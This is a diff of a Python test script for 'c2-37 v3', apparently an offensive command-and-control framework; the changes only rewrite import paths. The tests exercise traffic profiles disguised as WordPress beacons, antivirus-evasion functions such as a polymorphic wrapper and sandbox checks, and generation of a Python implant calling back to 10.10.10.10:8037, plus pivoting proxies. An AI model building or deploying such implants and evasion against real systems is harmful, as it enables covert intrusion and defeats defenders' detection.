@@ -1,6 +1,5 @@
 """Test c2-37 v3 modules: profiles, evasion, pivot."""
 import sys, time, socket
-sys.path.insert(0, "/root/projects/intercept37")
 
 print("=" * 60)
 print("  c2-37 v3 — Profiles, Evasion, Pivot Tests")
@@ -8,7 +7,7 @@ print("=" * 60)
 
 # ── Test Profiles ──
 print("\n[1] C2 Traffic Profiles...")
-from intercept37.c2.profiles import get_profile, list_profiles, PROFILES
+from c2_37.profiles import get_profile, list_profiles, PROFILES
 
 profiles = list_profiles()
 print(f"    [+] {len(profiles)} profiles: {[p['name'] for p in profiles]}")
@@ -40,7 +39,7 @@ print(f"    [+] WordPress profile: beacon={wp.beacon_uri}")
 
 # ── Test Evasion ──
 print("\n[2] AV Evasion Techniques...")
-from intercept37.c2.evasion import (
+from c2_37.evasion import (
     randomize_names, compress_and_exec, base64_exec,
     add_sandbox_checks, polymorphic_wrapper, apply_evasion
 )
@@ -89,7 +88,7 @@ assert p1 != p2  # Should be different each time
 print("    [+] Polymorphic wrapper OK (unique each gen)")
 
 # Full pipeline
-from intercept37.c2 import payloads
+from c2_37 import payloads
 implant_code = payloads.python_implant("http://10.10.10.10:8037")
 evaded = apply_evasion(implant_code, ["randomize", "poly", "compress"])
 assert "Implant" not in evaded
@@ -98,7 +97,7 @@ print(f"    [+] Full evasion pipeline: {len(implant_code)} -> {len(evaded)} byte
 
 # ── Test Pivot ──
 print("\n[3] Pivot/Proxy Modules...")
-from intercept37.c2.pivot import PortForward, Socks5Proxy, chisel_server
+from c2_37.pivot import PortForward, Socks5Proxy, chisel_server
 
 # Port forward
 pf = PortForward(19999, "127.0.0.1", 80)
